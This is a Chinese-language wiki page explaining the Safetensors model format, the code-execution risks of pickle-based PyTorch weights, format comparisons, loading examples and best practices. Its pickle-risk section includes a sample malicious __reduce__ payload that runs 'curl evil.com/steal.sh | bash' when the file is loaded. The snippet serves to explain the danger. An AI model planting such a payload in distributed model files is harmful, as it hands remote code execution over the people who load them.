---
title: "Safetensors 安全模型格式 (Safetensors Format)"
category: -concepts
tags: ["safetensors", "model-format", "serialization", "security", "huggingface"]
relationships:
  - target: "概念/model-formats"
    type: related_to
  - target: "概念/huggingface-cli"
    type: related_to
  - target: "概念/git-lfs"
    type: related_to
sources:
  - 12_架构基建/AI_Stack_Deep_Dive.md
summary: "Safetensors 是 HuggingFace 推出的安全模型序列化格式，替代 pickle 避免任意代码执行风险。已成为 HuggingFace Hub 的默认模型权重格式。"
provenance:
  extracted: 0.20
  inferred: 0.70
  ambiguous: 0.10
base_confidence: 0.85
lifecycle: reviewed
tier: core
created: 2026-06-25
updated: 2026-07-21
aliases:
  - "Safetensors"
  - "safetensors"
  - "安全张量格式"
name_zh: "Safetensors 安全模型格式"
---

# Safetensors 安全模型格式

> 中文简称：Safetensors 安全模型格式

> **一句话理解**: Safetensors 是"不执行代码的模型文件"——替代了危险的 pickle 格式，下载即安全，已是 HuggingFace Hub 的默认格式。

---

## 1. 核心问题：Pickle 的安全风险

传统 PyTorch 模型使用 **pickle** 序列化（`.bin` / `.pt` / `.pth`）：

| 风险 | 说明 |
|------|------|
| **任意代码执行** | pickle 反序列化时可执行任意 Python 代码 |
| **供应链攻击** | 恶意模型文件 = 远程代码执行 (RCE) |
| **不可审计** | pickle 是二进制格式，无法检查是否安全 |
| **CVE 频发** | 多次出现 HuggingFace 恶意模型事件 |

```python
# 危险的 pickle 攻击示例
import pickle, os
class Exploit:
    def __reduce__(self):
        return (os.system, ("curl evil.com/steal.sh | bash",))

# 用户下载并加载模型时，自动执行恶意代码
torch.load("malicious_model.bin")  # 💥 被攻击
```

---

## 2. Safetensors 解决方案

| 特性 | 说明 |
|------|------|
| **纯数据格式** | 只存储张量数据，不存储代码 |
| **零拷贝加载** | 使用 mmap 直接映射，无需反序列化 |
| **可审计** | JSON header + 二进制 body，可检查 |
| **跨框架** | 支持 PyTorch / TensorFlow / JAX / Flax |
| **更快** | 加载速度比 pickle 快 3-10 倍 |

### 文件格式

```
Safetensors 文件结构
│
├── Header（JSON，明文可读）
│   ├── 元数据：模型名称、版本、创建时间
│   └── 张量索引：每个张量的名称、shape、dtype、offset
│
└── Body（二进制，纯数据）
    └── 所有张量的原始字节数据（零拷贝映射）
```

---

## 3. 格式对比

| 维度 | Pickle (.bin) | Safetensors (.safetensors) | GGUF |
|------|--------------|--------------------------|------|
| **安全性** | ❌ 可执行代码 | ✅ 纯数据 | ✅ 纯数据 |
| **加载速度** | 慢（反序列化） | **快**（零拷贝 mmap） | 中 |
| **文件大小** | 大 | 中 | 最小（量化后） |
| **跨框架** | PyTorch only | PyTorch/TF/JAX/Flax | llama.cpp only |
| **可审计** | ❌ 二进制 | ✅ JSON header | ✅ 有 header |
| **量化支持** | 有限 | FP16/BF16/FP8/INT8 | 深度量化 |
| **典型用途** | 旧模型 | **标准模型分发** | 边缘推理 |
| **HuggingFace** | 逐步弃用 | **默认格式** | 社区贡献 |

---

## 4. 使用方式

### Python 加载

```python
# PyTorch
from safetensors.torch import load_file

tensors = load_file("model.safetensors")
# 安全加载，不会执行任何代码

# 分片加载（大模型通常分片）
# model-00001-of-00004.safetensors
# model-00002-of-00004.safetensors
# ...
from transformers import AutoModelForCausalLM
model = AutoModelForCausalLM.from_pretrained("Qwen/Qwen3-8B")
# 自动检测并加载 safetensors 格式
```

### CLI 转换

```bash
# 将 pickle 转换为 safetensors
python -c "
from safetensors.torch import save_file
import torch
state_dict = torch.load('model.bin', map_location='cpu')
save_file(state_dict, 'model.safetensors')
"
```

---

## 5. 在 AI Stack 生态中的位置

| 组件 | 格式支持 |
|------|---------|
| **Model Registry** | 原生存储 safetensors |
| **vLLM** | 原生加载 safetensors |
| **SGLang** | 原生加载 safetensors |
| **Ollama** | 内部转换为 GGUF |
| **HuggingFace Hub** | 默认 safetensors |
| **ModelScope** | 支持 safetensors |

---

## 6. 2026 年现状与最佳实践

| 方面 | 现状 |
|------|------|
| **采用率** | HuggingFace Hub 99%+ 新模型默认 Safetensors |
| **Pickle 状态** | 已被标记为 deprecated，新模型不应使用 |
| **分片格式** | 大模型 (>10GB) 自动分片，支持并行加载 |
| **FP8 支持** | 原生支持 FP8 权重存储 (H100/B200) |
| **流式加载** | 支持按需加载单层，减少启动时间 |
| **安全扫描** | HF Hub 自动检测非 Safetensors 模型并警告 |

### 生产最佳实践

1. **始终使用 Safetensors**: 新模型保存/分发一律用 `.safetensors`
2. **拒绝 pickle**: 不加载任何 `.bin`/`.pt` 格式的未知来源模型
3. **校验哈希**: 下载后核对 SHA256 确保完整性
4. **分片存储**: >10GB 模型使用分片格式，便于并行加载和断点续传
5. **元数据嵌入**: 在 header 中记录训练配置、量化信息、许可证

## 延伸阅读

- [[概念/Inference/model-formats|模型格式全景]]
- [[概念/Inference/gguf|GGUF 格式]]
- [[概念/Inference/quantization|量化]]
- [[12_架构基建/03_AI技术栈/02_AI技术栈_深入分析|AI Stack 深度解析]]

## SafeTensors vs 其他格式

| 维度 | SafeTensors | PyTorch (.bin) | GGUF | ONNX |
|------|-------------|---------------|------|------|
| **安全性** | 无代码执行 | pickle 风险 | 安全 | 安全 |
| **加载速度** | 极快 (mmap) | 慢 | 快 | 中 |
| **懒加载** | 支持 | 不支持 | 支持 | 部分 |
| **跨框架** | 是 | 仅 PyTorch | llama.cpp | 多框架 |
| **生态** | HuggingFace | PyTorch | 边缘 | 企业 |
| **推荐** | ✅ 首选 | ⚠️ 避免 | 边缘用 | 跨平台 |

## SafeTensors 使用示例

```python
from safetensors.torch import load_file, save_file
import torch

# 保存
tensors = {"weight": torch.randn(1024, 1024)}
save_file(tensors, "model.safetensors")

# 加载 (极快，支持 mmap)
loaded = load_file("model.safetensors")

# 懒加载 (只加载需要的层)
from safetensors import safe_open
with safe_open("model.safetensors", framework="pt") as f:
    keys = f.keys()  # 查看所有键
    weight = f.get_tensor("weight")  # 只加载指定层
```

## 生产最佳实践

1. **始终用 SafeTensors**：避免 pickle 安全风险
2. **大模型分片**：>10GB 模型用分片存储 (model-00001-of-00003.safetensors)
3. **元数据嵌入**：在 metadata 中存储模型信息 (framework, dtype)
4. **对象存储**：生产环境用 S3/OSS 存储，支持流式加载
5. **版本管理**：用 Git LFS 或 DVC 管理模型文件版本

---

## 2026 Safetensors 生态

| 特性/工具 | 说明 | 状态 |
|------|------|------|
| **Safetensors 0.5+** | 安全模型序列化格式 | GA |
| **零拷贝加载** | mmap 直接映射无需反序列化 | GA |
| **HF 默认格式** | HuggingFace Hub 默认存储格式 | GA |
| **多框架支持** | PyTorch/TF/JAX/Flax 全支持 | GA |
| **流式加载** | 支持分片流式读取大模型 | GA |

## 生产最佳实践

1. **优先 Safetensors**：新模型一律用 .safetensors 而非 .bin
2. **分片存储**：大模型按 5GB 分片，加速并行加载
3. **完整性校验**：加载时验证文件 hash，防止损坏
4. **对象存储**：生产环境用 S3/OSS 存储，支持流式加载
5. **权限控制**：模型文件设置严格访问权限，防止未授权下载
